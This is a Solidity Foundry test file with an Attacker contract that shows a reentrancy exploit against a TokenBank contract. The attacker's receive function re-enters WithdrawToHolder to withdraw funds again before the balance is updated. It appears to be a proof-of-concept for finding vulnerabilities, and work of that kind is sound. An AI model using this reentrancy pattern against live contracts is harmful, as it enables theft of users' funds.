// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function triggerWithdraw(address addr, uint256 amount) external {
        _contractUnderTest.WithdrawToHolder(addr, amount);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // Constraints & Pitfall Avoidance
        vm.assume(attackVal > 1 ether && attackVal < type(uint128).max);

        // Funding
        vm.deal(address(_contractUnderTest), attackVal * 5);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Setup: Attacker deposits to become a holder
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Transfer ownership to this test contract so we can call WithdrawToHolder
        _contractUnderTest.changeOwner(address(this));
        vm.prank(address(this));
        _contractUnderTest.confirmOwner();
        
        // Trigger the attack
        _attacker.attack(attackVal);

        // Verify Success
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;
    address public testContract;

    constructor(address victimAddress) { 
        _victim = TokenBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        testContract = msg.sender;
        
        // Deposit to become a holder - must be > MinDeposit (1 ether)
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture initial balance before the attack
        initialSnapshot = address(this).balance;
        
        // Store the value for re-entrant calls
        storedAttackVal = val;
        
        // The test contract (owner) will call WithdrawToHolder
        TestReentrancyTokenBank(payable(testContract)).triggerWithdraw(address(this), val);
        
        // Verify success - if we were called multiple times due to reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Reentrancy: The state (Holders[_addr]) is updated AFTER the external call
        // So we can re-enter and withdraw again while Holders[_addr] still has the original value
        if (attackCallCount < 3 && address(_victim).balance >= storedAttackVal) {
            try TestReentrancyTokenBank(payable(testContract)).triggerWithdraw(address(this), storedAttackVal) {
                // Reentrancy succeeded
            } catch {
                // Reentrancy blocked or failed
            }
        }
    }
}
